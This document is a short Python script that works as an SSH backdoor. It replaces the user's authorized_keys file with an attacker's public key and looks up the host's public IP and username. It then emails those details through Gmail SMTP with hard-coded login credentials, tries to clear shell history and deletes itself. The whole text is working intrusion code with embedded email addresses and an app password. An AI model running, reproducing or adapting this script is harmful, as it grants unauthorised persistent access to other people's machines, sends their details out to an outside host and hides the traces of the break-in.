import smtplib
import subprocess
from os import remove
from sys import argv
from email.mime.text import MIMEText

from requests import get

if __name__ == "__main__":

    public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFT8P80v8Ur1ngZkUHkRYspoF+EQXdwJrniFwtHF3XYexgbMR1OU3/ENoXiTEp4KMBuh86eurUXkETfpEABR2X21UsxfsgNnscz7A0KJTmkuOVT3hMzekYGZoa+1x/p35dyKlbMuPWCxcZv4khXv68WqDQIFzUx2mSMW9gHonQm2LKs4J06akmQa/68QkAHCfzrMEtKv/9wPkSlsFZvcyFm8PpC62HunZJg+dWrk9LK714kAamRYjf4rTAoa2c4vv4yA1E0nT5FVaW5zt1GU2RP3bw3RvVSQPVEKEf/P1W3MbxJUEciPHNTKLm5sS0ItWfxUTo/XWjdH8EY3AIFtfPhZeS1tSkARGOb0aHk5v7W2Mk/4UmwU7SGU4gRzOIVtWb62xbKVlrH1STMKxSSwohAAs5CeIT8GtQ47DGt0JbE1GeTvZq+kzyXKlagGYY2XtDZ6U81cqMh0VQCZCtvW5D8pvibHsmNBxwSTVLRmc4yyDSc2NovQ4h7HQ2jweEeDE= danie@DESKTOP-6UOPE8R"

    # Get public ip address with api
    ip = get('https://api.ipify.org').content.decode('utf8')
    print('My public IP address is: {}'.format(ip)) 


    # Get current user name
    user = subprocess.run('echo $USER', shell=True, stdout=subprocess.PIPE)

    # Overwrite authorized_keys with host key
    subprocess.run('cat ~/.ssh/authorized_keys', shell=True)
    subprocess.run(f'echo {public_key} > ~/.ssh/authorized_keys', shell=True)
    subprocess.run('cat ~/.ssh/authorized_keys', shell=True)
    user = user.stdout.decode()

    # Clear bash history if any
    subprocess.run('history', shell=True)

    msg = f'Hack successful ;)\nSSH Tunnel setup\nIP Address: {ip}\nUser: {user}'
    msg = MIMEText(msg)
    msg['Subject'] = "SSH Tunnel"
    msg['From'] = "pythonhacknsu@gmail.com"
    msg['To'] = "danielodom23@gmail.com"
    mail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    mail.login("pythonhacknsu@gmail.com", "pmzmxvjeqcsfmrxr")
    mail.sendmail("pythonhacknsu@gmail.com", "danielodom23@gmail.com", msg.as_string())
    mail.quit()

    # Delete the file
    remove(argv[0])
